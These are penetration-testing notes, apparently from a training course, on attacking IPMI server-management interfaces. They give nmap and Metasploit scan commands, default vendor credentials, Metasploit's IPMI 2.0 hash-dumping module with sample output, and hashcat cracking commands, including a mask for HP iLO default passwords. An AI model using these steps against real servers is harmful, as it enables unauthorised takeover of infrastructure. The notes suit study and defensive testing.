# IPMI

#### **What is IPMI?**

* IPMI is a hardware-based management system used for monitoring and remote management of servers, even if they are powered off or unresponsive.
* It works **independently** from the OS, BIOS, and CPU.
* Commonly found in **Cisco, Dell, HP, Supermicro**, and other enterprise servers.

#### **🔹 How IPMI Works?**

IPMI is used for:

1️⃣ **Before OS boot** – Modify BIOS settings.

2️⃣ **When the system is powered off** – Remote control & monitoring.

3️⃣ **After system failure** – Debugging & recovery.

It monitors **temperature, voltage, fan status, power supply**, and allows remote upgrades.

#### **🔹 Scanning for IPMI Services**

#### **Nmap Scan**

IPMI uses **UDP port 623**. To check if it is open:

```bash
sudo nmap -sU --script ipmi-version -p 623 <target-IP>
```

Example Output:

```
PORT    STATE SERVICE
623/udp open  asf-rmcp
| ipmi-version:
|   Version: IPMI-2.0
|   UserAuth: auth_user, non_null_user
|   PassAuth: password, md5, null
```

#### **📌 Metasploit Scan**

Metasploit has an **IPMI version scanner**:

```bash
msf6 > use auxiliary/scanner/ipmi/ipmi_version
msf6 auxiliary(scanner/ipmi/ipmi_version) > set rhosts <target-IP>
msf6 auxiliary(scanner/ipmi/ipmi_version) > run
```

#### **🔹 Default Credentials in IPMI**

Many servers have **default credentials** that are rarely changed:

| **Product**    | **Username**    | **Password**    |
| -------------- | --------------- | --------------- |
| **Dell iDRAC** | `root`          | `calvin`        |
| **HP iLO**     | `Administrator` | Random (8-char) |
| **Supermicro** | `ADMIN`         | `ADMIN`         |

Try **default passwords** first. If they work, you have full control!

#### **🔹 Exploiting IPMI Hash Disclosure**

IPMI 2.0 has a **flaw** where it sends password **hashes** before authentication!

#### **📌 Dumping Hashes with Metasploit**

```bash
msf6 > use auxiliary/scanner/ipmi/ipmi_dumphashes
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > set rhosts <target-IP>
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > run
```

Example Output:

```
[+] 10.129.42.195:623 - IPMI - Hash found: ADMIN:8e160d48....
[+] 10.129.42.195:623 - Password cracked: ADMIN
```

#### **📌 Cracking IPMI Hashes with Hashcat**

```bash
hashcat -m 7300 ipmi_hash.txt rockyou.txt
```

If HP iLO uses a **factory default password**, try:

```bash
hashcat -m 7300 ipmi.txt -a 3 ?1?1?1?1?1?1?1?1 -1 ?d?u
```

This tests **all uppercase letters & numbers** (HP’s default format).

#### **🔹 Why is IPMI Dangerous?**

* If an attacker gains access to **IPMI credentials**, they can: ✅ **Reboot or power off** servers remotely. ✅ **Modify BIOS settings** and boot custom OS images. ✅ **Install malware or persistent backdoors**. ✅ **Perform remote code execution** on the server.

***

<figure><img src="../../.gitbook/assets/Screenshot 2025-03-20 002856.png" alt=""><figcaption></figcaption></figure>

then broken hash

<figure><img src="../../.gitbook/assets/Screenshot 2025-03-20 002946.png" alt=""><figcaption></figcaption></figure>
